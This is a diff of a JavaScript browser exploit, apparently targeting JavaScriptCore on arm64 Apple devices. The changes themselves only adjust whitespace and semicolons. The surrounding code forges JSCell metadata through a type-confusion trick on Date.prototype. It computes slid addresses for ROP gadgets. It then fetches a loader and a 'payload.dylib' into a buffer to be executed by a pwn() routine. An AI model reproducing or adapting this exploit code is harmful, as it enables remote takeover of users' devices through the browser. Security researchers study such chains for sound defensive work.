@@ -96,7 +96,7 @@ function pwn(loader_length, payload_length) {
 
 			hack = 1;
 			victim(s,f64,u32,confuse);
-		
+
 			hack = 0;
 			Object.setPrototypeOf(Date.prototype, orig);
 			return confuse[1];
@@ -152,8 +152,8 @@ function pwn(loader_length, payload_length) {
 		return victim.p0;
 	}
 
-	u32[0] = 0x200                // Structure ID
-	u32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
+	u32[0] = 0x200;                // Structure ID
+	u32[1] = 0x01082007 - 0x10000; // Fake JSCell metadata, adjusted for boxing
 	let outer = {
 		p1: f64[0],
 		p2: manager,
@@ -278,7 +278,7 @@ function pwn(loader_length, payload_length) {
 	//   ldp x2, x0, [x8, #0x20]
 	//   br x2
 	const gadget_2 = 0x01a9447468 + slide;
-	
+
 	// 0x0000000194d29dc8 :
 	//   stp x8, x1, [sp]
 	//   ldr x8, [x0]
@@ -392,7 +392,7 @@ async function go() {
 	if (loader_length > 0x8000) {
 		throw new Error("loader_length");
 	}
-	u8_buffer.set(new Uint8Array(loader_buffer), 0x8000)
+	u8_buffer.set(new Uint8Array(loader_buffer), 0x8000);
 
 	const payload = await fetch("payload.dylib");
 	const payload_buffer = await payload.arrayBuffer();
@@ -400,7 +400,7 @@ async function go() {
 	if (payload_length > MAX_BUFFER_SIZE - 0x10000) {
 		throw new Error("payload_length");
 	}
-	u8_buffer.set(new Uint8Array(payload_buffer), 0x10000)
+	u8_buffer.set(new Uint8Array(payload_buffer), 0x10000);
 
 	log(`[i] got ${loader_length} bytes of loader, ${payload_length} bytes of payload, pwning`);
 	pwn(loader_length, payload_length);
